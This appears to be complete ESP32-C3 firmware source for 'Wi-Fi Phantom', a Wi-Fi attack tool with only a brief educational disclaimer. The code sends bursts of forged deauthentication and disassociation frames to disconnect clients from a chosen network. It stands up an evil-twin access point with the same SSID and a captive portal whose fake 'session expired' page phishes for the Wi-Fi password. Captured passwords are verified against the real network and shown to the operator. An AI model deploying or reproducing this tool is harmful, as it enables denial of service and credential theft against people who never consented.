/*
 * Wi-Fi Phantom v2.0 - ESP32-C3 Port
 * A professional WiFi Security Testing Tool (Evil Twin & Deauther)
 * 
 * GitHub: https://github.com/Tanzeel0Hussain/Wi-Fi-Phantom
 * Disclaimer: For educational purposes only. Use only on networks you own.
 */

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <HTTPClient.h>
#include "esp_wifi.h"


// --- Network Structure ---
typedef struct
{
  String ssid;    // Network Name
  uint8_t ch;     // Operating Channel
  uint8_t bssid[6]; // MAC Address
  int rssi;       // Signal Strength
}  _Network;


// --- Global Configuration ---
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];   // Storage for scanned networks
_Network _selectedNetwork; // Current target network

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
  
}

String _correct = "";      // Stores captured password
String _tryPassword = "";  // Temporary password storage

// Default main strings
#define SUBTITLE "Wireless Gateway"
#define TITLE "Authentication Required"
#define BODY "Your session has expired. Please re-authenticate with your Wi-Fi password to continue using the network services. This is a mandatory security measure."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "* { box-sizing: border-box; }"
               "body { background-color: #f4f7f9; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }"
               ".navbar { background-color: #0056b3; color: white; padding: 15px 20px; font-size: 1.2em; font-weight: bold; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
               ".container { width: 90%; max-width: 450px; margin: 20px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border: 1px solid #e1e4e8; }"
               "h1 { color: #0056b3; font-size: 1.4em; margin-bottom: 20px; text-align: center; border-bottom: 2px solid #f0f0f0; padding-bottom: 10px; }"
               "p { line-height: 1.6; font-size: 0.9em; color: #555; margin-bottom: 20px; }"
               "input[type=password] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 1em; }"
               "input[type=submit] { width: 100%; background-color: #0056b3; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 1.1em; font-weight: bold; transition: background 0.3s; }"
               "input[type=submit]:hover { background-color: #004494; }"
               ".footer { text-align: center; margin: 20px 0; font-size: 0.8em; color: #999; }"
               ;
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " - Login</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><div class='navbar'>" + SUBTITLE + "</div><div class='container'><h1>" + t + "</h1>";
  return h;
}

String footer() {
  return "</div><div class='footer'>&copy; 2024 Network Solutions. All rights reserved.</div></body></html>";
}

String index() {
  return header(TITLE) + "<p>" + BODY + "</p><form action='/' method=post><input type=password id='password' name='password' placeholder='Wi-Fi Password' minlength='8' required></input><input type=submit value='Connect'></form>" + footer();
}

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_promiscuous(true);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("TP-Link_3473", "Password");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background-color:#f4f7f9;color:#333;font-family:'Segoe UI',sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}.card{background:white;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;max-width:300px; border-top: 5px solid #d9534f;}h2{color:#d9534f;margin-bottom:10px;}p{color:#666;}</style></head><body><div class='card'><h2>Login Failed</h2><p>The password provided is incorrect. Please try again.</p></div></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("TP-Link_3473", "Password");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

// --- Main Admin Panel HTML ---
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   "* { box-sizing: border-box; }"
                   "body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 10px; overflow-x: hidden; }"
                   ".container { border: 1px solid #0f0; padding: 15px; box-shadow: 0 0 15px #0f0; background: rgba(0,20,0,0.9); width: 100%; }"
                   "h2 { text-transform: uppercase; letter-spacing: 1px; text-shadow: 0 0 5px #0f0; font-size: 1.2em; }"
                   ".table-wrapper { width: 100%; overflow-x: auto; margin-top: 20px; -webkit-overflow-scrolling: touch; }"
                   "table { width: 100%; border-collapse: collapse; border: 1px solid #0f0; min-width: 400px; }"
                   "th, td { border: 1px solid #0f0; padding: 8px; text-align: left; font-size: 0.8em; }"
                   "th { background-color: #030; color: #fff; }"
                   "button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px 10px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; font-size: 0.7em; }"
                   "button:hover { background: #0f0; color: #000; box-shadow: 0 0 10px #0f0; }"
                   "button:disabled { border-color: #030; color: #030; cursor: not-allowed; }"
                   ".sig-bar { display: inline-block; width: 3px; background: #0f0; margin-right: 1px; vertical-align: bottom; }"
                   ".sig-dim { background: #030; }"
                   ".status { font-weight: bold; padding: 5px; margin-bottom: 10px; display: inline-block; border: 1px solid #0f0; font-size: 0.8em; }"
                   "</style>"
                   "</head><body><div class='container'>"
                   "<h2>[ Wi-Fi Phantom v2.0 ]</h2>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div><div class='table-wrapper'><table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>Signal</th><th>Action</th></tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("TP-Link_3473", "Password");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      String rssiStr = "";
      int bars = map(_networks[i].rssi, -100, -40, 1, 5);
      for(int b=1; b<=5; b++) {
        if(b <= bars) rssiStr += "<div class='sig-bar' style='height:" + String(b*4) + "px;'></div>";
        else rssiStr += "<div class='sig-bar sig-dim' style='height:" + String(b*4) + "px;'></div>";
      }

      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" + rssiStr + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #0f0; color: #000;'>SELECTED</button></form></td></tr>";
      } else {
        _html += "<button>SELECT</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><head><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script><style>body{background-color:#f4f7f9;color:#333;font-family:'Segoe UI',sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;}.card{background:white;padding:30px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:center;max-width:400px;}h2{color:#0056b3;margin-bottom:20px;}progress{width:100%;height:20px;accent-color:#0056b3;}</style></head><body><div class='card'><h2>Verifying Connection</h2><p>Please wait while the system validates your credentials...</p><progress value='10' max='100'>10%</progress></div></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("TP-Link_3473", "Password");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    String rssiStr = "";
    int bars = map(_networks[i].rssi, -100, -40, 1, 5);
    for(int b=1; b<=5; b++) {
      if(b <= bars) rssiStr += "<div class='sig-bar' style='height:" + String(b*4) + "px;'></div>";
      else rssiStr += "<div class='sig-bar sig-dim' style='height:" + String(b*4) + "px;'></div>";
    }

    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" + rssiStr + "</td><td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #0f0; color: #000;'>SELECTED</button></form></td></tr>";
    } else {
      _html += "<button>SELECT</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauthentication Logic
  if (deauthing_active && millis() - deauth_now >= 100) { // Increased frequency to 100ms
    deauth_now = millis();

    // Lock to target channel
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);

    // Frame structure: [Type/Subtype][Flags][Duration][RA][TA][BSSID][Seq][Reason]
    uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x00, 0x00, 
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter: To be filled
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
      0x00, 0x00, 0x01, 0x00              // Seq and Reason Code (1 = Unspecified)
    };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);

    // Send a burst of deauth frames
    for(int i=0; i<3; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      
      // Also send Disassociation frame (0xA0)
      deauthPacket[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
      deauthPacket[0] = 0xC0; // Reset for next burst
    }

    Serial.print("Deauth burst sent on CH ");
    Serial.println(_selectedNetwork.ch);
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
